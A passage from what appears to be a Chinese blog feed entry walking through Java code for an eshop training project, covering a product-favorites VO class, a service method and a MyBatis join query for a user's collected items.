class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.eshop.modules.business.vo;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.eshop.serializer.DoubleSerializer;</span><br><span class="line"><span class="keyword">import</span> com.fasterxml.jackson.databind.annotation.JsonSerialize;</span><br><span class="line"><span class="keyword">import</span> io.swagger.annotations.ApiModel;</span><br><span class="line"><span class="keyword">import</span> io.swagger.annotations.ApiModelProperty;</span><br><span class="line"><span class="keyword">import</span> lombok.Data;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.Serializable;</span><br><span class="line"><span class="keyword">import</span> java.util.Date;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Data</span></span><br><span class="line"><span class="meta">@ApiModel(value = &quot;StoreProductRelationQueryVo对象&quot;, description = &quot;商品点赞和收藏表查询参数&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">StoreProductRelationQueryVo</span> <span class="keyword">implements</span> <span class="title class_">Serializable</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">long</span> <span class="variable">serialVersionUID</span> <span class="operator">=</span> <span class="number">1L</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> Long id;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@ApiModelProperty(value = &quot;用户ID&quot;)</span></span><br><span class="line">    <span class="keyword">private</span> Long uid;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@ApiModelProperty(value = &quot;商品ID&quot;)</span></span><br><span class="line">    <span class="keyword">private</span> Long productId;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@ApiModelProperty(value = &quot;类型(收藏(collect）、点赞(like))&quot;)</span></span><br><span class="line"><span class="meta">    private String type;</span></span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">    @ApiModelProperty(value = &quot;某种类型的商品(普通商品、秒杀商品)&quot;)</span></span><br><span class="line"><span class="meta">    private String category;</span></span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">    @ApiModelProperty(value = &quot;添加时间&quot;)</span></span><br><span class="line"><span class="meta">    private Date createTime;</span></span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">    @ApiModelProperty(value = &quot;产品图片&quot;)</span></span><br><span class="line"><span class="meta">    private String image;</span></span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">    @ApiModelProperty(value = &quot;是否显示&quot;)</span></span><br><span class="line"><span class="meta">    private Integer isShow;</span></span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">    @ApiModelProperty(value = &quot;原价&quot;)</span></span><br><span class="line"><span class="meta">    @JsonSerialize(using = DoubleSerializer.class)</span></span><br><span class="line"><span class="meta">    private Double otPrice;</span></span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">    @ApiModelProperty(value = &quot;父ID&quot;)</span></span><br><span class="line"><span class="meta">    private Integer pid;</span></span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">    @ApiModelProperty(value = &quot;产品价格&quot;)</span></span><br><span class="line"><span class="meta">    @JsonSerialize(using = DoubleSerializer.class)</span></span><br><span class="line"><span class="meta">    private Double price;</span></span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">    @ApiModelProperty(value = &quot;产品销量&quot;)</span></span><br><span class="line"><span class="meta">    private Integer sales;</span></span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">    @ApiModelProperty(value = &quot;商品名称&quot;)</span></span><br><span class="line"><span class="meta">    private String storeName;</span></span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">    @ApiModelProperty(value = &quot;是否开启积分兑换&quot;)</span></span><br><span class="line"><span class="meta">    private Integer isIntegral;</span></span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">    @ApiModelProperty(value = &quot;积分&quot;)</span></span><br><span class="line"><span class="meta">    private Integer integral;</span></span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">&#125;</span></span><br></pre></td></tr></table></figure><p>service层：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 获取用户收藏列表</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> page page</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> limit limit</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> uid 用户id</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span> list</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">List&lt;StoreProductRelationQueryVo&gt; <span class="title function_">userCollectProduct</span><span class="params">(<span class="type">int</span> page, <span class="type">int</span> limit, Long uid, String type)</span>;</span><br></pre></td></tr></table></figure><p>实现该业务功能：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 获取用户收藏列表</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> page page</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> limit limit</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> uid 用户id</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span> list</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">public</span> List&lt;StoreProductRelationQueryVo&gt; <span class="title function_">userCollectProduct</span><span class="params">(<span class="type">int</span> page, <span class="type">int</span> limit, Long uid, String type)</span> &#123;</span><br><span class="line">    Page&lt;StoreProductRelation&gt; pageModel = <span class="keyword">new</span> <span class="title class_">Page</span>&lt;&gt;(page, limit);</span><br><span class="line">    List&lt;StoreProductRelationQueryVo&gt; list = productRelationMapper.selectRelationList(pageModel,uid,type);</span><br><span class="line">    <span class="keyword">return</span> list;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>因为此操作涉及到多表查询，mybatisplus并未给我们提供相关可以调用的接口，因此我们需要自己编写接口，实现我们的需求。代码如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Select(&quot;select B.id pid,A.type as category,B.store_name as storeName,B.price,B.is_integral as isIntegral,&quot; +</span></span><br><span class="line"><span class="meta">            &quot;B.ot_price as otPrice,B.sales,B.image,B.is_show as isShow,B.integral as integral&quot; +</span></span><br><span class="line"><span class="meta">            &quot; from store_product_relation A left join store_product B &quot; +</span></span><br><span class="line"><span class="meta">            &quot;on A.product_id = B.id where A.type=#&#123;type&#125; and A.uid=#&#123;uid&#125; and A.is_del = 0 and B.is_del = 0 order by A.create_time desc&quot;)</span></span><br><span class="line">    List&lt;StoreProductRelationQueryVo&gt; <span class="title function_">selectRelationList</span><span class="params">(Page page, <span class="meta">@Param(&quot;uid&quot;)</span> Long uid, <span class="meta">@Param(&quot;type&quot;)</span> String type)</span>;</span><br></pre></td></tr></table></figure><p>至此接口编写完毕！！</p><h2 id="程序排错">程序排错</h2>]]></content>
    
    
    <summary type="html">eshop商城项目实训源码</summary>
    
    
    
    <category term="Java" scheme="https://www.777nx.cn/categories/Java/"/>
    
    
    <category term="eshop" scheme="https://www.777nx.cn/tags/eshop/"/>
    
  </entry>
  
</feed>
